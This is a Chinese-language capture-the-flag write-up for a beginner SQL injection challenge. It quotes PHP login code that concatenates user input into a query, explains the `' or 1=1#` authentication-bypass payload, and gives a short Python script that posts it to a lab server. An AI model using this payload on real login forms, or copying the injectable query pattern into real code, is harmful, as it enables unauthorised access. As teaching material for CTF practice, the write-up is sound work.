# bear的注入

## 出题思路

入门级SQL注入题，即使你不知道什么是SQL注入，也完全可以使用网上搜到的万能密码从而获取flag。

## 解题思路

定位到`login.php`中的这一句

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql="SELECT * FROM users WHERE username='$username' and password='$password'";
```

用户上传的username和password被拼接到了SQL语句中，这个SQL语句将会被执行。

正常的程序逻辑

```
从users表中查询是否有username = 上传的username 并且 password = 上传的password的用户
```

此时我们可以看到，上传的数据只作为数据校验的，本身不完成逻辑操作。

当上传`username=admin&password=123' or 1=1#`之后

SQL语句变化

```sql
SELECT *users where username='admin' and password='123' or 1=1#'
```

程序的逻辑

```
从users表中查询是否有(username = 上传的username 并且 password = 上传的password) 或者 1=1
```

1=1是一个恒等式，那么此时的筛选条件也就失去了意义，将会从表中筛选出全部的用户，顺利地实现了登录

## 解题脚本

```python
import requests


url = 'http://192.168.80.128:8848/login.php'

data = {
    'username':'admin',
    'password':"123' or 1=1#"
}

r = requests.post(
    url = url,
    data = data
)

print(r.text)
```

